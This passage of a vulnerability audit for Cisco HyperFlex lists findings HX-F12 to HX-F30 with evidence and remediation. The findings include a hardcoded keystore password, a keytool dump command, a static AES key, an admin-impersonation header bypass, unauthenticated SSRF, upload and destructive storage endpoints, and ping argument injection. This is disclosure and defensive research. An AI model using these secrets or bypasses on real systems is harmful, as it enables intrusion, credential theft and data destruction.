            "zk_path": "/chap/<initiator-iqn>  {chapName: b64(RSA-enc), chapSecret: b64(RSA-enc)}",
            "decrypt_data": "iscsisvc:0x28bcf0 -> PKCS12_parse -> RSA_private_decrypt(0x100, ct, pt, key, RSA_PKCS1_PADDING=1)",
            "get_keystore_passwd": "iscsisvc:0x28b7e0 -> GetXmlTagValue -> base64 decode -> PKCS12 password",
            "build_path": "/opt/git/cypress/opensrc/istgt/src/chap_util.c",
        },
        "versions_affected": ["6.0.2b-44423"],
    },
    "HX-F12": {
        "title": "Hardcoded Keystore Password 'springpath' Across All HyperFlex Keystores",
        "severity": "HIGH",
        "component": "/etc/hyperflex/secure/hyperflex_security.properties -> /usr/share/hyperflex/storfs-misc/",
        "description": (
            "The file /etc/hyperflex/secure/hyperflex_security.properties (a symlink to "
            "/usr/share/hyperflex/storfs-misc/hyperflex_security.properties) contains "
            "a single XML entry: <entry key=\"keystore_password\">c3ByaW5ncGF0aA==</entry>. "
            "Decoded from base64: 'springpath' (the acquired company name). "
            "This password unlocks both the PKCS#12 keystore used by iscsisvc for CHAP "
            "credential decryption (HX-F11) and the JCEKS keystore "
            "(/etc/hyperflex/secure/hyperflex_keystore.jceks) containing a vCenter client "
            "RSA private key and an AES encryption key. The password is static across "
            "all deployments and versions. The properties file is world-readable via the "
            "world-traversable /etc/hyperflex/secure/ directory (drwxr-xr-x). "
            "Any local process on stCtlVM can read both keystores and the password."
        ),
        "code_evidence": {
            "properties_content": "<entry key=\"keystore_password\">c3ByaW5ncGF0aA==</entry>",
            "decoded_password": "springpath",
            "properties_symlink": "/etc/hyperflex/secure/hyperflex_security.properties -> /usr/share/hyperflex/storfs-misc/hyperflex_security.properties",
            "directory_perms": "drwxr-xr-x 2 root root  /etc/hyperflex/secure/",
            "jceks_perms": "-rw-r--r-- 1 root root 2700  hyperflex_keystore.jceks",
        },
        "versions_affected": ["6.0.2b-44423"],
    },
    "HX-F13": {
        "title": "World-Readable JCEKS Keystore Contains vCenter Client RSA Key and AES Encryption Key",
        "severity": "HIGH",
        "component": "/etc/hyperflex/secure/hyperflex_keystore.jceks",
        "description": (
            "The JCEKS keystore at /etc/hyperflex/secure/hyperflex_keystore.jceks "
            "(world-readable, 2700 bytes) contains two entries decryptable with "
            "the hardcoded password 'springpath' (HX-F12): "
            "(1) 'vcenter_client': RSA private key with certificate CN=*.cisco.com, "
            "OU=Engineering, O='Cisco, Inc.', self-signed, valid until 2055-10-31. "
            "This wildcard certificate is used for authenticating the HyperFlex cluster "
            "to vCenter. An attacker who extracts this key can impersonate the cluster "
            "to any vCenter integration endpoint. "
            "(2) 'aes_encryption': AES SecretKeyEntry — the symmetric key used for "
            "HyperFlex data-at-rest encryption operations. Extracting this key provides "
            "access to encrypted storage data without LUKS key derivation. "
            "Both keys are accessible to any local process on stCtlVM via the world-readable "
            "keystore file and the hardcoded password."
        ),
        "code_evidence": {
            "jceks_magic": "0xCECECECE (Java KeyStore, JCEKS type)",
            "entry_1": "alias=aes_encryption, type=SecretKeyEntry",
            "entry_2": "alias=vcenter_client, type=PrivateKeyEntry",
            "vcenter_cert_cn": "CN=*.cisco.com, OU=Engineering, O=\"Cisco, Inc.\", L=SanJose, ST=California, C=US",
            "vcenter_cert_valid": "2025-11-06 through 2055-10-31 (30-year validity)",
            "vcenter_cert_sig": "SHA512withRSA",
            "vcenter_cert_serial": "7ee31744949b791",
            "vcenter_cert_sha256": "9D:FB:29:E4:B5:AC:A9:21:65:CC:71:C2:A6:81:7A:0C:BD:07:66:4D:4B:01:34:DD:DF:47:FE:79:AE:AC:1C:5A",
            "password": "springpath (see HX-F12)",
            "keytool_cmd": "keytool -list -v -keystore hyperflex_keystore.jceks -storetype JCEKS -storepass springpath",
        },
        "versions_affected": ["6.0.2b-44423"],
    },
    "HX-F14": {
        "title": "hxdp Connector Cloud Domain Overridable via Environment Variable",
        "severity": "MEDIUM",
        "component": "hxdp-connector bundle / bin/hxdp",
        "description": (
            "The hxdp connector binary reads ENV_ANDROMEDA_DOMAIN_NAME and "
            "ENV_SERVICE_DOMAIN_NAME environment variables at runtime to resolve the "
            "Intersight cloud endpoint. If either variable is set in the connector "
            "process environment on stCtlVM, the connector will direct its WebSocket "
            "management channel to the attacker-specified domain instead of "
            "svc-static1.ucs-connect.com. An attacker with any path to modify the "
            "connector process environment (compromised init system, writable service "
            "unit, environment file injection) can redirect all device management traffic "
            "to an attacker-controlled Intersight lookalike. "
            "ENV_WEB_ELB_DOMAIN_NAME and ENV_WEB_ELB_DNS_NAME are additional domain "
            "override variables also present in the binary."
        ),
        "code_evidence": {
            "env_vars": [
                "ENV_ANDROMEDA_DOMAIN_NAME",
                "ENV_SERVICE_DOMAIN_NAME",
                "ENV_WEB_ELB_DOMAIN_NAME",
                "ENV_WEB_ELB_DNS_NAME",
            ],
            "default_endpoint": "svc-static1.ucs-connect.com (WebSocket)",
            "binary": "bin/hxdp (Go, 1.0.11-20250305, UPX-packed, 25MB unpacked)",
        },
        "versions_affected": ["1.0.11-20250305 (connector bundle)"],
    },
    "HX-F15": {
        "title": "Go Runtime pprof Debug Endpoints Embedded in hxdp Connector Binary",
        "severity": "MEDIUM",
        "component": "hxdp-connector bundle / bin/hxdp",
        "description": (
            "The hxdp connector binary imports net/http/pprof, registering "
            "/debug/pprof/, /debug/pprof/cmdline, and /debug/pprof/profile "
            "on the connector's HTTP listener. If the local HTTP service "
            "(Create HTTP service at %s) does not require authentication for the "
            "/debug/ namespace, these endpoints expose: running goroutine stacks, "
            "heap memory profiles, and the connector process command-line arguments. "
            "The connector handles SUDI certificates and Intersight credentials — "
            "goroutine stack dumps may include these in-flight."
        ),
        "code_evidence": {
            "pprof_paths": ["/debug/pprof/", "/debug/pprof/cmdline", "/debug/pprof/profile"],
            "log_string": "Create HTTP service at %s",
            "restapi_string": "https://localhost/rest/",
            "plugin_strings": ["plugin HttpRequest Start() called", "plugin Net Start() called"],
        },
        "versions_affected": ["1.0.11-20250305 (connector bundle)"],
    },
    "HX-F16": {
        "title": "Non-Production Intersight Staging Domain Strings Hardcoded in Production Binary",
        "severity": "LOW",
        "component": "hxdp-connector bundle / bin/hxdp",
        "description": (
            "Five Cisco-internal non-production Intersight cloud domains are hardcoded "
            "as string literals in the production hxdp connector binary: "
            "cntcicd.starshipcloud.com (CI/CD), staging.starshipcloud.com (staging), "
            "cntperf.starshipcloud.com (performance), sretest.starshipcloud.com (SRE test), "
            "cntqa.starshipcloud.com (QA). These expose Cisco's internal cloud deployment "
            "topology and environment naming. Combined with ENV_ANDROMEDA_DOMAIN_NAME (HX-F14), "
            "any of these domains could be set as the connector target, directing a "
            "deployed cluster to connect to Cisco's internal staging infrastructure."
        ),
        "code_evidence": {
            "staging_domains": [
                "cntcicd.starshipcloud.com",
                "staging.starshipcloud.com",
                "cntperf.starshipcloud.com",
                "sretest.starshipcloud.com",
                "cntqa.starshipcloud.com",
            ],
            "internal_names": "starship (project), apollo (connector code), diesel (build system)",
            "build_path": "/mnt/vol1/jenkins/workspace/starship/master/diesel/code/apollo/",
        },
        "versions_affected": ["1.0.11-20250305 (connector bundle)"],
    },

    "HX-F17": {
        "title": "auth Service Links Archived dgrijalva/jwt-go v4.0.0-preview1 with alg:none Path Compiled In",
        "severity": "HIGH",
        "component": "/opt/hyperflex/auth/auth (9.5MB ELF, not stripped)",
        "description": (
            "The HyperFlex stSSOMgr authentication service (hx-auth binary) uses "
            "dgrijalva/jwt-go v4.0.0-preview1, a preview release of an archived Go JWT library "
            "(archived by maintainer 2021-01, superseded by golang-jwt/jwt). "
            "The binary contains the symbol strings '*jwt.signingMethodNone' and "
            "'*jwt.unsafeNoneMagicConstant', confirming the alg:none signing path is "
            "compiled into the binary. CVE-2020-26160 (audience claim validation bypass) "
            "affects dgrijalva/jwt-go <4.0.0. An attacker who can present a token signed "
            "with alg:none — accepted if the token parser does not explicitly reject it — "
            "bypasses signature verification. The service accepts JWTs at localhost:9334 "
            "(stSSOMgr) and issues tokens used across the HXDP REST API surface."
        ),
        "code_evidence": {
            "library": "github.com/dgrijalva/jwt-go v4.0.0-preview1",
            "symbols_confirmed": ["*jwt.signingMethodNone", "*jwt.unsafeNoneMagicConstant"],
            "binary_path": "/opt/hyperflex/auth/auth",
            "service": "stSSOMgr on localhost:9334",
            "http_stack": "Gorilla mux v1.7.1",
            "cve": "CVE-2020-26160 (jwt-go audience bypass, <4.0.0)",
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance VMDK)"],
        "remediation": (
            "Replace dgrijalva/jwt-go with golang-jwt/jwt v4+ or v5. "
            "Add explicit algorithm check at token parse: "
            "jwt.ParseWithClaims(token, &claims, keyFunc, jwt.WithValidMethods([]string{\"RS256\"}))."
        ),
    },

    "HX-F18": {
        "title": "Installer REST API Entirely Unauthenticated — All Cluster Operations Exposed",
        "severity": "CRITICAL",
        "component": "installerrestapi-1.0.0.war (WEB-INF/web.xml)",
        "description": (
            "The HyperFlex installer appliance REST API at /rest/* has authentication "
            "intentionally disabled. web.xml contains the comment "
            "'Disable AAA Authentication for installer rest api' wrapping the entire "
            "authentication filter block (SPBasicAuth and SPAuth). No <security-constraint> "
            "elements are present. All REST endpoints — including cluster creation, expansion, "
            "and shutdown; stcli command execution; vCenter credential validation; ESXi credential "
            "retrieval; file upload; and HXDP REST proxying — are accessible to any host on "
            "the management network without credentials. Applies to: "
            "/rest/*, /upload, /internalsupport/*, /st-support/*, /storfs-support/*."
        ),
        "code_evidence": {
            "web_xml_comment": "Disable AAA Authentication for installer rest api",
            "commented_out_filters": [
                "SPBasicAuth -> com.springpath.hx.aaa.filters.basicAuthFilter.SSOBasicAuthImpl",
                "SPAuth -> com.springpath.hx.aaa.filters.ssoFilter.SSOAuthFilterImpl",
            ],
            "commented_out_filter_mappings": ["SPBasicAuth -> /rest/*", "SPAuth -> /rest/*"],
            "unauthenticated_operations": [
                "BootstrapResource: createCluster, expandCluster, shutdownCluster, deployNodes",
                "BootstrapResource: executeCommand (stcli/sysmtool/mkfs.storfs allowlist)",
                "BootstrapResource: validateVcenterCredentials, getVcServerDetails",
                "BootstrapResource: pings (internal host enumeration)",
                "DeploymentResource: getResponseFromHxdpRest (SSRF proxy to HXDP REST)",
                "DeploymentResource: configInstaller, updateCatalog, deployNodesJob",
                "StorvisorFileUploader: /upload (file write to /var/www/localhost/images/)",
                "VirtPlatformResource: getVirtualMachines, getEvents, powerOnOffVM",
            ],
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
        "remediation": (
            "Re-enable the SPBasicAuth and SPAuth servlet filters in web.xml. "
            "At minimum, gate all write-capable endpoints (createCluster, deployNodes, upload) "
            "behind authentication. The installer appliance should not be network-accessible "
            "outside of the dedicated HyperFlex management VLAN."
        ),
    },

    "HX-F19": {
        "title": "Unauthenticated pings() Endpoint Executes OS ping on Caller-Supplied IPs",
        "severity": "MEDIUM",
        "component": "installerrestapi-1.0.0.war / BootstrapResource.pings()",
        "description": (
            "BootstrapResource.pings(List<String>) calls Runtime.exec() on a concatenation "
            "of the caller-supplied IP string with the template "
            "'timeout 1 ping -c 1 <ip>' (confirmed via BootstrapMethods attribute #1 in "
            "BootstrapResource.class). Because Runtime.exec(String) tokenizes by whitespace "
            "without shell invocation, classic shell metacharacters do not achieve code "
            "execution. However, the endpoint is unauthenticated (HX-F18) and accepts a "
            "list of arbitrary IP strings, enabling: (1) internal management network host "
            "enumeration — any IP that returns exit code 0 is added to the response; "
            "(2) argument injection via embedded spaces — flags can be appended to the ping "
            "command. The response is the list of IPs that were reachable."
        ),
        "code_evidence": {
            "call_site": "BootstrapResource.pings() offset 0x40-0x55",
            "exec_call": "java.lang.Runtime.getRuntime().exec(String) at bytecode offset 69",
            "template": "timeout 1 ping -c 1 <userInput>",
            "template_source": "BootstrapMethods attribute #1: '#2567 timeout 1 ping -c 1 \\u0001'",
            "no_shell": "Runtime.exec(String) uses StringTokenizer — no shell metachar expansion",
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
    },

    "HX-F20": {
        "title": "Unauthenticated HXDP REST Proxy Enables SSRF into Internal Cluster Services",
        "severity": "HIGH",
        "component": "installerrestapi-1.0.0.war / DeploymentResource.getResponseFromHxdpRest()",
        "description": (
            "DeploymentResource.getResponseFromHxdpRest(HxCredDetails creds, String urlPath) "
            "accepts caller-supplied credentials and a URL path, proxies the request to the "
            "internal HXDP REST API via the installer's Thrift client, and returns the raw "
            "response. The endpoint is unauthenticated (HX-F18). An attacker on the management "
            "network can use the installer as an authenticated relay into the deployed cluster's "
            "REST API — issuing management operations against a live cluster without direct "
            "network access to it, supplying any credentials in the HxCredDetails body. "
            "WebDownloader.trustAllHttpsCertificates() (HX-F22) ensures no TLS validation "
            "occurs on the outbound connection to the cluster."
        ),
        "code_evidence": {
            "method_signature": (
                "public JsonObject getResponseFromHxdpRest("
                "com.storvisor.sysmgmt.bootstrap.model.HxCredDetails, java.lang.String)"
            ),
            "backing_service": "DeploymentServiceAccess.getResponseFromHxdpRest() -> StDeploy$Client Thrift",
            "thrift_endpoint": "strings: 'Connecting to {}' + 'trustAll' -> /stdeploy",
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
        "remediation": "Require authentication on all /rest/* endpoints (HX-F18 remediation covers this). "
                       "Validate the URL path parameter against an allowlist; reject paths containing "
                       "scheme prefixes, parent-directory sequences, and internal-only service identifiers.",
    },

    "HX-F21": {
        "title": "Unauthenticated File Upload Writes to Installer Image Serving Directory",
        "severity": "MEDIUM",
        "component": "installerrestapi-1.0.0.war / StorvisorFileUploader (/upload)",
        "description": (
            "StorvisorFileUploader.doPost() at /upload accepts multipart POST requests "
            "without authentication (HX-F18) and writes uploaded files to "
            "/var/www/localhost/images/ (set via StorvisorFileUploadPath context parameter). "
            "No path traversal sanitization is visible in the decompiled bytecode. "
            "An attacker on the management network can write arbitrary files to the "
            "installer image directory — potentially replacing firmware images served to "
            "ESXi hosts during deployment or injecting malicious images that are automatically "
            "consumed by the HyperFlex installation workflow."
        ),
        "code_evidence": {
            "servlet_path": "/upload",
            "target_dir": "/var/www/localhost/images/",
            "context_param": "StorvisorFileUploadPath",
            "upload_lib": "org.apache.commons.fileupload.servlet.ServletFileUpload",
            "auth_present": False,
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
        "remediation": "Require authentication on /upload. "
                       "Validate uploaded file type, name, and size before write. "
                       "Write to a staging path; verify image integrity before promoting to the serving directory.",
    },

    "HX-F22": {
        "title": "Installer JVM Globally Disables TLS Certificate Validation via TrustAllManager",
        "severity": "MEDIUM",
        "component": "installerrestapi-1.0.0.war / WebDownloader.trustAllHttpsCertificates()",
        "description": (
            "WebDownloader.trustAllHttpsCertificates() installs a no-op TrustManager "
            "(TrustAllManager) and an always-accepting HostnameVerifier globally into "
            "javax.net.ssl.HttpsURLConnection via setDefaultSSLSocketFactory() and "
            "setDefaultHostnameVerifier(). Both DeploymentServiceAccess and DataServiceAccess "
            "call trustAll before establishing Thrift connections to backend services, making "
            "this the live execution path during all installer-to-cluster communication. "
            "Any HTTPS connection from the installer JVM process — including cluster deployment "
            "callbacks, catalog downloads, and HXDP REST proxy calls — is susceptible to "
            "MITM on the management network."
        ),
        "code_evidence": {
            "class": "com.storvisor.sysmgmt.service.WebDownloader",
            "inner_class": "WebDownloader$TrustAllManager (implements javax.net.ssl.TrustManager)",
            "install_site": "HttpsURLConnection.setDefaultSSLSocketFactory(sslCtx.getSocketFactory())",
            "hostname_verifier": "WebDownloader$2 (always returns true)",
            "callers": ["DeploymentServiceAccess.openClientConnection()", "DataServiceAccess.openClientConnection()"],
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
        "remediation": "Remove TrustAllManager and the global SSL socket factory override. "
                       "Use a dedicated SSLContext loaded from the JCEKS keystore (HX-F13) for "
                       "cluster connections; validate cluster certificates against a pinned CA.",
    },

    "HX-F23": {
        "title": "ZooKeeper UUID Authentication Token Derivable from Unauthenticated REST Endpoint",
        "severity": "MEDIUM",
        "component": "storfs-support/zkClient.py + /rest/v1/cluster (unauthenticated)",
        "description": (
            "HyperFlex ZooKeeper authentication uses a cluster UUID as the shared secret. "
            "zkClient.py reads the UUID from /etc/hyperflex/clusteruuid and presents it to "
            "ZooKeeper as auth scheme 'UUID' with the string 'postEvent;<cluster_uuid>'. "
            "The cluster UUID is exposed without authentication at the HX Connect REST endpoint "
            "GET /rest/v1/cluster, which returns the cluster UUID among other fields. "
            "An attacker on the management network can obtain the ZK auth token from the "
            "unauthenticated REST API and then authenticate to the ZooKeeper ensemble at "
            "localhost:2181 (port typically reachable from the stCtlVM management interface). "
            "Successful ZK access exposes: CHAP credential RSA ciphertexts (which are decryptable "
            "via the PKCS12 keystore using the static 'springpath' password — HX-F11/HX-F12), "
            "cluster topology, vCenter registration state, and storage configuration. "
            "Whether ZK auth is enforced depends on the 'useZKAuth' flag in /etc/hyperflex/storfs.cfg."
        ),
        "code_evidence": {
            "auth_scheme": "UUID",
            "auth_string_template": "'postEvent;' + cluster_uuid",
            "uuid_source_file": "/etc/hyperflex/clusteruuid",
            "uuid_public_endpoint": "GET /rest/v1/cluster (no auth required)",
            "zk_connect": "127.0.0.1:2181 (storfs.cfg: zkConnectString or crmZKEnsemble)",
            "auth_flag": "useZKAuth in /etc/hyperflex/storfs.cfg",
            "source_file": "/opt/hyperflex/storfs-support/zkClient.py",
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance + stCtlVM)"],
        "remediation": "Replace UUID-based ZK auth with a random per-cluster credential "
                       "generated at deployment time and stored in a protected location. "
                       "Do not expose the cluster UUID via any unauthenticated endpoint if it "
                       "doubles as an authentication credential for other internal services.",
    },

    "HX-F24": {
        "title": "Tunes Credential Encryption AES Key Derived from Static Firmware-Embedded File",
        "severity": "HIGH",
        "component": (
            "/usr/share/hyperflex/storfs-misc/springpath_env_parse.py + "
            "/usr/share/hyperflex/storfs-misc/Secret.class"
        ),
        "description": (
            "springpath_env_parse.parseEnvVariableTunes() uses AES-128-CBC to encrypt and "
            "decrypt credential values stored in the springpath .tunes INI files "
            "(/opt/hyperflex/springpath_default.tunes, springpath_custom_cluster.tunes, "
            "springpath_custom_node.tunes). The AES key is derived as the MD5 hex digest "
            "of Secret.class: md5('/usr/share/hyperflex/storfs-misc/Secret.class') = "
            "'1f6d13bcd7753f2d3b2e2da361b7afb5'. Secret.class is a static firmware-embedded "
            "file shipped in every HyperFlex 6.0.2b installation. The key is identical across "
            "all deployments of the same firmware version — there is no per-deployment key "
            "derivation, no salt, and no secret component outside the firmware image. "
            "Any party with access to the firmware package can compute the key and decrypt "
            "all credentials stored in the tunes infrastructure, including "
            "credentials.installer_passwd (consumed by deployNodes.py at startup)."
        ),
        "code_evidence": {
            "key_derivation": "key = hashlib.md5(open(Secret.class, 'rb').read()).hexdigest()",
            "key_value": "1f6d13bcd7753f2d3b2e2da361b7afb5",
            "secret_class_path": "/usr/share/hyperflex/storfs-misc/Secret.class",
            "cipher": "AES-128-CBC (pycryptodome Crypto.Cipher.AES, MODE_CBC)",
            "iv_handling": "IV prepended to ciphertext, base64-encoded",
            "plaintext_pad": "PKCS#7 equivalent (pad to 16-byte boundary with pad char = chr(pad_len))",
            "affected_credential": "credentials.installer_passwd (deployNodes.py)",
            "source_file": "/usr/share/hyperflex/storfs-misc/springpath_env_parse.py",
        },
        "versions_affected": ["6.0.2b-44423 (stCtlVM + installer appliance)"],
        "remediation": (
            "Replace file-MD5-derived key with a per-deployment randomly generated AES key "
            "stored in a protected keystore (e.g., the existing JCEKS keystore under "
            "/etc/hyperflex/secure/). Secret.class should not serve as a key derivation input "
            "since it is publicly distributed with the firmware."
        ),
    },

    "HX-F25": {
        "title": "Installer Go Binary Exposes Explicit SSRF Proxy Endpoint at /rest/deployment/proxy",
        "severity": "HIGH",
        "component": "/opt/hyperflex/hxinstaller/installer (Go binary, REST API)",
        "description": (
            "The HyperFlex installer Go binary (hxinstaller/installer) registers a REST "
            "endpoint at /rest/deployment/proxy?url=<target>. The endpoint accepts an "
            "arbitrary URL via the 'url' query parameter and proxies the request to the "
            "specified target, returning the response. This is an explicit server-side "
            "request forgery primitive built into the installer service. Combined with the "
            "installer appliance's network position on the HyperFlex management network, "
            "the endpoint provides access to internal services not directly reachable from "
            "the attacker's network position. The auth posture of this endpoint in the Go "
            "binary's own mux is not separately confirmed (distinct from the WAR's disabled "
            "auth — HX-F18), but the endpoint is structurally an SSRF proxy regardless of "
            "auth status."
        ),
        "code_evidence": {
            "endpoint_string": "/rest/deployment/proxy?url=",
            "binary": "/opt/hyperflex/hxinstaller/installer (Go, 15MB, not stripped)",
            "source_tree": "bitbucket-eng-chn-sjc1.cisco.com/HXDP/installer-v2/server/",
            "route_registration": "gorilla mux (runtime-assembled routes)",
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
        "remediation": (
            "Remove the /rest/deployment/proxy endpoint or gate it to internal use only. "
            "If a proxy is required for cluster communication, restrict the target URL to "
            "an allowlist of known internal service addresses and ports. "
            "Log all proxy requests with full URL for audit."
        ),
    },

    "HX-F26": {
        "title": "stSSOMgr Thrift Service Exposes Hyper-V Host Admin Credentials Without Authentication",
        "severity": "HIGH",
        "component": "/opt/hyperflex/auth/auth (stSSOMgr service, localhost:9334)",
        "description": (
            "The HyperFlex auth binary runs the stSSOMgr Thrift service on localhost:9334 "
            "using TBinaryProtocol/TFramedTransport with no authentication layer on the "
            "Thrift connection. The StSSOMgr.getHypervHostCreds() RPC returns a JSON object "
            "containing the Hyper-V host local admin username and base64-encoded password: "
            "{'host': {'localadminusername': '<user>', 'localadminusercred': '<b64_pass>'}}. "
            "Credentials are sourced from ZooKeeper. Any process on the installer appliance "
            "or stCtlVM that can reach localhost:9334 — including code execution via HX-F18 "
            "or HX-F19 — can retrieve Windows Hyper-V host admin credentials by opening a "
            "raw Thrift connection without presenting any credential. This enables lateral "
            "movement from the HyperFlex management plane to Hyper-V host infrastructure."
        ),
        "code_evidence": {
            "service_port": "localhost:9334 (TSocket.TSocket('localhost', 9334))",
            "transport": "TTransport.TFramedTransport (no auth wrapper)",
            "rpc": "StSSOMgr.Client.getHypervHostCreds()",
            "response_schema": (
                "JSON: {'host': {'localadminusername': str, 'localadminusercred': str (base64)}}"
            ),
            "auth_on_connect": None,
            "source_file": "/opt/hyperflex/stssoclient.py",
            "service_binary": "/opt/hyperflex/auth/auth",
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance + stCtlVM)"],
        "remediation": (
            "Add Thrift transport-level authentication to stSSOMgr (e.g., SASL/PLAIN or "
            "a pre-shared token validated on every connection). Restrict port 9334 to "
            "specific authorized callers via process-level controls or Unix domain socket "
            "instead of TCP. Rotate the Hyper-V admin credentials independently of the "
            "stSSOMgr credential vault."
        ),
    },

    "HX-F27": {
        "title": "Installer deployNodes.py Disables TLS Certificate Verification for All HTTP Calls",
        "severity": "MEDIUM",
        "component": "/opt/hyperflex/deployNodes.py",
        "description": (
            "deployNodes.py passes verify=False to every requests.get() and requests.post() "
            "call — covering cluster deployment status polling, checkDeployNodes, and "
            "deployNodes REST calls against the installer appliance. The verify=False flag "
            "disables both certificate chain validation and hostname verification in the "
            "Python requests library. All HTTPS connections from this script — including "
            "those transmitting authentication credentials (Basic Auth via auth=authData) "
            "and cluster deployment payloads — are susceptible to MITM on the management "
            "network. The installer password (credentials.installer_passwd) is transmitted "
            "as HTTP Basic Auth over these unvalidated HTTPS connections."
        ),
        "code_evidence": {
            "pattern": "requests.get/post(url, auth=authData, verify=False, ...)",
            "occurrences": [
                "deploymentsUrl GET (line 148)",
                "progressUrl GET (line 152)",
                "checkDeployNodesUrl POST (lines 156, 164)",
                "deployNodesUrl POST (lines 160, 169)",
            ],
            "credential_exposure": "auth=authData carries (opts.user, opts.password) = INSTALLER_PASSWD",
            "source_file": "/opt/hyperflex/deployNodes.py",
        },
        "versions_affected": ["6.0.2b-44423 (installer appliance)"],
        "remediation": (
            "Remove verify=False. Load the installer appliance's self-signed certificate "
            "(generated at deploy time) into a trusted bundle and pass verify='<path>' "
            "to requests calls. If mutual TLS is required, use the vcenter_client key from "
            "the JCEKS keystore (HX-F13) for client certificate auth."
        ),
    },

    "HX-F28": {
        "title": "StPlatform Thrift Interface Exposes 40+ Destructive Storage Operations Without Authentication",
        "severity": "HIGH",
        "component": "/opt/hyperflex/storfs-core/storfs (20MB ELF, storfs daemon, port 9966)",
        "description": (
            "The storfs storage daemon exports its core management interface as a Thrift "
            "StPlatformProcessor with over 40 methods covering destructive storage operations: "
            "formatDisks, deleteFiles, createFiles, removeDisk, retireDisks, blacklistDisks, "
            "unclaimDisks, enableZKAuth, cloneDatastore, teardownNRNFS, and others. "
            "Symbol table analysis of the 20MB storfs ELF (28,996 symbols, not stripped) "
            "confirms no StPlatformAuthorizingProcessor class is present — the standard "
            "authorization wrapper used in other Thrift service deployments is absent. "
            "Disassembly of the representative method process_getCluster (0x9692a0) shows "
            "no authentication or authorization check before dispatching to "
            "StPlatform_getCluster_args::read(TProtocol*). The same pattern is expected "
            "for destructive methods. The StPlatform interface port (9966, confirmed from "
            "storfs binary strings) is exposed on the stCtlVM. Any process that can reach "
            "the storfs Thrift socket — including code execution obtained through HX-F18 "
            "or HX-F19 on the installer appliance — can invoke storage-destruction operations "
            "against the HyperFlex cluster data fabric."
        ),
        "code_evidence": {
            "binary": "/opt/hyperflex/storfs-core/storfs (20MB ELF, PIE, partial RELRO, canary, 28996 symbols)",
            "symbol_evidence": "StPlatformProcessor present; StPlatformAuthorizingProcessor absent",
            "destructive_handlers": [
                "process_formatDisks", "process_deleteFiles", "process_createFiles",
                "process_removeDisk", "process_retireDisks", "process_blacklistDisks",
                "process_unclaimDisks", "process_enableZKAuth", "process_cloneDatastore",
                "process_teardownNRNFS",
            ],
            "port": "9966 (from storfs binary string literals)",
            "auth_check_absent": "process_getCluster @ 0x9692a0: direct dispatch to args::read, no auth call",
            "auth_wrapper_absent": "StPlatformAuthorizingProcessor not in symbol table",
        },
        "versions_affected": ["6.0.2b-44423 (stCtlVM)"],
        "remediation": (
            "Introduce an authorization wrapper (analogous to StPlatformAuthorizingProcessor) "
            "that validates a session token on every Thrift call before dispatching. "
            "Restrict the StPlatform port (9966) to loopback only via iptables and verify "
            "that the calling process matches an expected service identity. "
            "Audit all process_* handlers to confirm no production path reaches destructive "
            "operations without a prior privilege check."
        ),
    },

    "HX-F29": {
        "title": "SSOPrivilegeAuthImpl Accepts User-Controlled X-RootSessionID Header to Bypass Authentication",
        "severity": "HIGH",
        "component": (
            "authfilter-1.0.0.jar / SSOPrivilegeAuthImpl "
            "(HX Connect REST API filter chain, mapped to /v1/*)"
        ),
        "description": (
            "SSOPrivilegeAuthImpl.validateAuthHeaderForPrivilegeCreds() implements an "
            "intra-node privilege bypass path in the HX Connect REST API filter chain. "
            "When the X-RootSessionID request header is present and matches the content of "
            "/etc/hyperflex/secure/root_file.pub (read by HxSecurity.getLocalSessionId()), "
            "the filter accepts the values of three additional caller-controlled headers as "
            "the authenticated identity without any credential verification: "
            "X-LoggedInUser (becomes com.springpath.hx.aaa.authenticateduser), "
            "X-Scope (becomes com.springpath.hx.aaa.authenticateduserscope), and "
            "X-RequestInitiator (becomes com.springpath.hx.aaa.reqinitiatorip). "
            "The downstream ServiceAccessAuthFilterImpl short-circuits on Authenticated=True "
            "and lets the request through. "
            "An attacker who can read /etc/hyperflex/secure/root_file.pub can impersonate "
            "any user (e.g., X-LoggedInUser: admin) with MODIFY scope on any HX Connect "
            "REST endpoint without presenting any password or token. "
            "The /etc/hyperflex/secure/ directory is world-traversable (drwxr-xr-x) and "
            "other files in that directory (hyperflex_keystore.jceks) are world-readable "
            "(rw-r--r--), suggesting root_file.pub is likely world-readable on the stCtlVM. "
            "A malicious local service or a process with arbitrary file read (e.g., via path "
            "traversal in another endpoint) can extract the file and forge admin sessions."
        ),
        "code_evidence": {
            "filter_class": (
                "com.springpath.hx.aaa.filters.privilegeAuthFilter.SSOPrivilegeAuthImpl"
                " (authfilter-1.0.0.jar)"
            ),
            "session_id_source": "/etc/hyperflex/secure/root_file.pub (HxSecurity.getLocalSessionId())",
            "match_logic": "X-RootSessionID.equals(HxSecurity.getLocalSessionId()) -> authenticated",
            "identity_headers": {
                "X-LoggedInUser": "com.springpath.hx.aaa.authenticateduser",
                "X-Scope": "com.springpath.hx.aaa.authenticateduserscope (READ or MODIFY)",
                "X-RequestInitiator": "com.springpath.hx.aaa.reqinitiatorip",
            },
            "downstream_filter": (
                "ServiceAccessAuthFilterImpl checks getAttribute('Authenticated') == 'True' "
                "and calls chain.doFilter() if true — bypasses all remaining auth filters"
            ),
            "authorized_endpoint": (
                "AuthorizedApiServiceImpl.authorizedRequest() fallback path (offset 253): "
                "SSOPrivilegeAuthImpl.validateAuthHeaderForPrivilegeCreds first, "
                "before SessionCookieFilter and KerberosFilter"
            ),
        },
        "versions_affected": ["6.0.2b-44423 (stCtlVM, storfs-restapi)"],
        "remediation": (
            "Replace the file-based session ID with a cryptographically random token "
            "generated at service startup and stored in memory only (not on disk). "
            "Restrict the privilege bypass path to loopback-originated requests at the "
            "network layer — reject X-RootSessionID from any non-127.0.0.1 source. "
            "Audit other services that read root_file.pub (e.g., HostCredentialsAccess) "
            "to ensure they do not expose its content through any API endpoint."
        ),
    },
    "HX-F30": {
        "title": "StorfsSupportBundle Servlet Exposes System Support Bundle Generation Without Authentication",
        "severity": "HIGH",
        "component": (
            "ROOT.war / com.storvisor.sysmgmt.service.StorfsSupportBundle "
            "(stCtlVM, URL pattern /storfs-support/*, no filter mapping)"
        ),
        "description": (
            "The StorfsSupportBundle HttpServlet is registered at /storfs-support/* in ROOT.war "
